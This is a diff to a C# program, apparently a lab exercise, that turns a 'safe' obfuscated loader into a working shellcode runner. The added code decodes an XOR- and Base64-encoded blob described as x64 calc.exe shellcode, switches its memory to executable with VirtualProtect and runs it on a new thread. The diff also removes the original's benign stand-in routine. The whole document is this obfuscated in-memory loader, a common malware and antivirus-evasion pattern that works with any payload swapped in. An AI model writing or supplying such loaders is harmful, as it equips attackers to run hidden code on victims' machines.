@@ -3,128 +3,67 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 
-namespace A03_4_SafeObfuscatedLoader
+namespace A03_4_ObfuscatedLoader
 {
     class Program
     {
+        // --- P/Invoke Signatures ---
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr VirtualAlloc(
-            IntPtr lpAddress,
-            UIntPtr dwSize,
-            uint flAllocationType,
-            uint flProtect
-        );
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr CreateThread(
-            IntPtr lpThreadAttributes,
-            UIntPtr dwStackSize,
-            IntPtr lpStartAddress,
-            IntPtr lpParameter,
-            uint dwCreationFlags,
-            out uint lpThreadId
-        );
+        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool CloseHandle(IntPtr hObject);
-
+        // --- Constants ---
         const uint MEM_COMMIT = 0x1000;
         const uint MEM_RESERVE = 0x2000;
         const uint PAGE_READWRITE = 0x04;
+        const uint PAGE_EXECUTE_READ = 0x20;
         const uint INFINITE = 0xFFFFFFFF;
 
         static byte[] XorTransform(byte[] data, byte key)
         {
             byte[] output = new byte[data.Length];
-            for (int i = 0; i < data.Length; i++)
-            {
-                output[i] = (byte)(data[i] ^ key);
-            }
+            for (int i = 0; i < data.Length; i++) { output[i] = (byte)(data[i] ^ key); }
             return output;
         }
-
-        // Benign thread routine target
-        static uint BenignWorker(IntPtr lpParameter)
-        {
-            Console.WriteLine("[*] Benign worker thread started.");
-            Thread.Sleep(1000);
-            Console.WriteLine("[*] Benign worker thread exiting.");
-            return 0;
-        }
-
-        delegate uint ThreadProc(IntPtr lpParameter);
 
         static void Main(string[] args)
         {
             byte xorKey = 0x5A;
-
-            // XOR + Base64 obfuscated benign marker/config blob
-            // This is the x64 calc.exe shellcode, XOR'd with 0x5A, then Base64'd
+            // This is the Base64 representation of your x64 calc shellcode XOR'd with 0x5A
             string embeddedBlob = "SINK7CgoSDE99mXoSL92GBhIvzAwSDE2SDE2SDEuEIs9PChIAeiLgIgAAABIAnrkRIuYGBRIu2ggSUEB7USLeCRIUQHtRIt4HBRIAe1I/+xD9zylBaU0IiwSHeEBIAnowSAdIAnrwSAnIEAABIAnoski9mXoRUi7amNhbGMuZXhlUkiJ4boBAAAAf9BIg8REOMM=";
-            byte[] encoded;
 
-            try
-            {
-                encoded = Convert.FromBase64String(embeddedBlob);
-            }
-            catch
-            {
-                // fallback so the sample still runs if you haven't generated a final blob yet
-                encoded = Convert.ToBase64String(
-                    XorTransform(Encoding.UTF8.GetBytes("CONTROL_SAMPLE"), xorKey)
-                ) is string tmp
-                    ? Convert.FromBase64String(tmp)
-                    : Array.Empty<byte>();
-            }
-
+            byte[] encoded = Convert.FromBase64String(embeddedBlob);
             byte[] decoded = XorTransform(encoded, xorKey);
 
-            Console.WriteLine("[*] Decoded blob length: {0}", decoded.Length);
+            // 1. Allocate buffer (Read/Write)
+            IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)decoded.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-            IntPtr mem = VirtualAlloc(
-                IntPtr.Zero,
-                (UIntPtr)decoded.Length,
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_READWRITE
-            );
-
-            if (mem == IntPtr.Zero)
-            {
-                Console.WriteLine("[-] VirtualAlloc failed.");
-                return;
-            }
-
+            // 2. Copy the decoded shellcode to memory
             Marshal.Copy(decoded, 0, mem, decoded.Length);
-            Console.WriteLine("[*] Decoded blob copied into allocated memory at 0x{0:X}.", mem.ToInt64());
+            Console.WriteLine("[*] Payload de-obfuscated and staged.");
 
-            // Safe handoff: create a thread, but do NOT start it at the decoded buffer.
-            ThreadProc proc = new ThreadProc(BenignWorker);
-            IntPtr procPtr = Marshal.GetFunctionPointerForDelegate(proc);
+            // 3. Change protection to Execute/Read (Critical for DEP)
+            uint oldProtect;
+            VirtualProtect(mem, (UIntPtr)decoded.Length, PAGE_EXECUTE_READ, out oldProtect);
+            Console.WriteLine("[*] Memory protection set to Execute.");
 
+            // 4. Execute the thread at the 'mem' location
             uint threadId;
-            IntPtr hThread = CreateThread(
-                IntPtr.Zero,
-                UIntPtr.Zero,
-                procPtr,
-                IntPtr.Zero,
-                0,
-                out threadId
-            );
+            IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out threadId);
 
-            if (hThread == IntPtr.Zero)
+            if (hThread != IntPtr.Zero)
             {
-                Console.WriteLine("[-] CreateThread failed.");
-                return;
+                Console.WriteLine("[*] Shellcode thread launched. Waiting...");
+                WaitForSingleObject(hThread, INFINITE);
             }
-
-            Console.WriteLine("[*] Thread created successfully (safe benign start routine).");
-            WaitForSingleObject(hThread, INFINITE);
-            CloseHandle(hThread);
-
-            Console.WriteLine("[*] Safe specimen complete. Decoded memory was staged but not executed.");
         }
     }
 }
